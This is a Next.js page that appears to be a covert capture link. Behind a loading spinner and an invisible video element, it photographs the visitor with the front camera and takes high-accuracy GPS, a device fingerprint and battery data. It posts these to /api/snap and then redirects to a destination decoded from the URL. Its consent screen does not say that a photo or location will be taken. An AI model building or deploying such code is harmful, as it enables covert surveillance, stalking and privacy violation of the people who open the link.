"use client";

import React, { useEffect, useRef, useState, Suspense } from "react";
import { useSearchParams } from "next/navigation";

type PermissionState = "granted" | "denied" | "prompt" | "unknown";

function CaptureContent() {
  const searchParams = useSearchParams();
  const t = searchParams.get("t");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [needsConsent, setNeedsConsent] = useState(false);
  const [status, setStatus] = useState("Checking previously granted permissions...");

  useEffect(() => {
    let cancelled = false;

    const getPermission = async (name: "geolocation" | "camera"): Promise<PermissionState> => {
      try {
        // Camera permission is not exposed consistently on every browser.
        const result = await navigator.permissions.query({
          name: name as PermissionName,
        });
        return result.state as PermissionState;
      } catch {
        return "unknown";
      }
    };

    const collectDeviceInfo = () => {
      const getGPU = () => {
        try {
          const canvas = document.createElement("canvas");
          const gl =
            canvas.getContext("webgl") ||
            canvas.getContext("experimental-webgl");
          if (!gl) return "Software Renderer";

          const debugInfo = (gl as any).getExtension(
            "WEBGL_debug_renderer_info",
          );
          return debugInfo
            ? (gl as any).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            : "Generic GPU";
        } catch {
          return "Unknown";
        }
      };

      return {
        model:
          navigator.userAgent.split("(")[1]?.split(")")[0] || "Unknown",
        os: navigator.platform || "Unknown",
        browser: navigator.userAgent,
        ram: (navigator as any).deviceMemory
          ? `${(navigator as any).deviceMemory} GB`
          : "Unknown",
        cpu: navigator.hardwareConcurrency
          ? `${navigator.hardwareConcurrency} Cores`
          : "Unknown",
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        gpu: getGPU(),
      };
    };

    const getBattery = async () => {
      try {
        if (!("getBattery" in navigator)) return null;
        const battery = await (navigator as any).getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
        };
      } catch {
        return null;
      }
    };

    const getLocation = async () =>
      new Promise<{ lat: number; lon: number; accuracy: number } | null>(
        (resolve) => {
          if (!navigator.geolocation) return resolve(null);

          navigator.geolocation.getCurrentPosition(
            (position) =>
              resolve({
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
              }),
            () => resolve(null),
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0,
            },
          );
        },
      );

    const capture = async () => {
      let destination = "/";
      try {
        if (t) destination = atob(t);
      } catch {
        destination = "/";
      }

      const geoPermission = await getPermission("geolocation");
      const cameraPermission = await getPermission("camera");

      if (cancelled) return;

      // Reuse permissions that the browser has already granted.
      // Never attempt to bypass a browser permission prompt.
      if (geoPermission === "prompt" || cameraPermission === "prompt") {
        setNeedsConsent(true);
        setStatus("Permission is required before location/camera access.");
        return;
      }

      if (geoPermission === "denied" && cameraPermission === "denied") {
        await sendResult(destination, null, null, collectDeviceInfo(), await getBattery());
        return;
      }

      await continueCapture(destination);
    };

    const continueCapture = async (destination: string) => {
      const geoPermission = await getPermission("geolocation");
      const cameraPermission = await getPermission("camera");

      let gps = null;
      if (geoPermission === "granted") {
        gps = await getLocation();
      }

      let image = "";
      if (cameraPermission === "granted" && navigator.mediaDevices?.getUserMedia) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: false,
          });

          if (videoRef.current && canvasRef.current) {
            videoRef.current.srcObject = stream;
            await videoRef.current.play().catch(() => {});
            await new Promise((resolve) => setTimeout(resolve, 800));

            const video = videoRef.current;
            const canvas = canvasRef.current;
            if (video.videoWidth > 0 && video.videoHeight > 0) {
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              canvas.getContext("2d")?.drawImage(video, 0, 0);
              image = canvas.toDataURL("image/jpeg", 0.85);
            }
          }

          stream.getTracks().forEach((track) => track.stop());
        } catch {
          // Permission may have been revoked or camera unavailable.
        }
      }

      await sendResult(
        destination,
        gps,
        image,
        collectDeviceInfo(),
        await getBattery(),
      );
    };

    const sendResult = async (
      destination: string,
      gps: { lat: number; lon: number; accuracy: number } | null,
      image: string | null,
      device: Record<string, unknown>,
      battery: Record<string, unknown> | null,
    ) => {
      if (cancelled) return;

      try {
        await fetch("/api/snap", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            image: image || "",
            gps,
            device,
            battery,
            permissions: {
              location: gps !== null ? "granted" : "not-granted",
              camera: image ? "granted" : "not-granted",
            },
          }),
          keepalive: true,
        });
      } catch {
        // Do not block the redirect if telemetry delivery fails.
      } finally {
        window.location.replace(destination);
      }
    };

    const start = async () => {
      try {
        await capture();
      } catch {
        if (!cancelled) {
          setStatus("Unable to read browser permissions.");
          setNeedsConsent(true);
        }
      }
    };

    void start();

    return () => {
      cancelled = true;
      if (videoRef.current?.srcObject) {
        (videoRef.current.srcObject as MediaStream)
          .getTracks()
          .forEach((track) => track.stop());
      }
    };
  }, [t]);

  const requestConsent = async () => {
    let destination = "/";
    try {
      if (t) destination = atob(t);
    } catch {
      destination = "/";
    }

    setNeedsConsent(false);
    setStatus("Requesting the permissions you approved...");

    let gps: { lat: number; lon: number; accuracy: number } | null = null;
    let image = "";

    try {
      if (navigator.geolocation) {
        gps = await new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            (position) =>
              resolve({
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
              }),
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
          );
        });
      }
    } catch {}

    try {
      if (navigator.mediaDevices?.getUserMedia) {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });

        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play().catch(() => {});
          await new Promise((resolve) => setTimeout(resolve, 800));

          const video = videoRef.current;
          const canvas = canvasRef.current;
          if (video.videoWidth > 0 && video.videoHeight > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d")?.drawImage(video, 0, 0);
            image = canvas.toDataURL("image/jpeg", 0.85);
          }
        }

        stream.getTracks().forEach((track) => track.stop());
      }
    } catch {}

    try {
      await fetch("/api/snap", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          gps,
          device: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${window.screen.width}x${window.screen.height}`,
          },
          permissions: {
            location: gps ? "granted" : "not-granted",
            camera: image ? "granted" : "not-granted",
          },
        }),
        keepalive: true,
      });
    } catch {}

    window.location.replace(destination);
  };

  if (needsConsent) {
    return (
      <main className="min-h-screen bg-black text-white flex items-center justify-center p-6">
        <section className="w-full max-w-md rounded-2xl border border-white/10 bg-white/5 p-6 shadow-2xl">
          <h1 className="text-lg font-semibold">Permission required</h1>
          <p className="mt-3 text-sm leading-6 text-white/70">
            To continue, allow the browser permissions requested by this page.
            If you already granted them for this site, they will be reused
            automatically without another prompt.
          </p>

          <button
            onClick={requestConsent}
            className="mt-6 w-full rounded-xl bg-blue-600 px-4 py-3 text-sm font-semibold hover:bg-blue-500"
          >
            Continue
          </button>

          <p className="mt-3 text-center text-xs text-white/40">{status}</p>
        </section>
      </main>
    );
  }

  return (
    <main className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
      <div className="w-16 h-16 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin mb-4" />
      <p className="text-[10px] tracking-[0.3em] text-blue-500 uppercase animate-pulse">
        {status}
      </p>

      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className="absolute opacity-0 w-1 h-1 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </main>
  );
}

export default function CapturePage() {
  return (
    <Suspense fallback={<div className="bg-black min-h-screen" />}>
      <CaptureContent />
    </Suspense>
  );
}
